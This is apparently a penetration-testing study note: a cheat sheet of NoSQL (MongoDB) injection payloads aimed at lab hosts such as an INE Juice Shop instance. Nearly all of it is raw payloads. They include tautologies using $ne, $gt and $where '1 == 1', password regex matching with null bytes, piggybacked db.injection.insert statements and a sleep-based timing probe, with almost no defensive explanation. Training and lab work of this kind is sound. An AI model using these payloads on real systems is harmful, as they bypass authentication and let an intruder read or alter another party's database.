## Injections
Paper on NoSQL injection: https://arxiv.org/ftp/arxiv/papers/1506/1506.04082.pdf

## Simple bolean true injection (Tautologies)
```sql
# This is equal to 1=1 in SQLi
http://<target-site>?id{\"\$ne\":null}
http://demo1.ine.local/?name[$ne]=bob
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
'||''==''
```

## Sleep

```html
http://juiceshop.ine.local:3000/rest/product/<vulnerable>/reviews
http://juiceshop.ine.local:3000/rest/product/sleep(10000)/reviews
```
# NoSQL attack
* Tautologies
* Union queries
* JavaScript injections
* Piggybacked queries
* Cross-origin violations
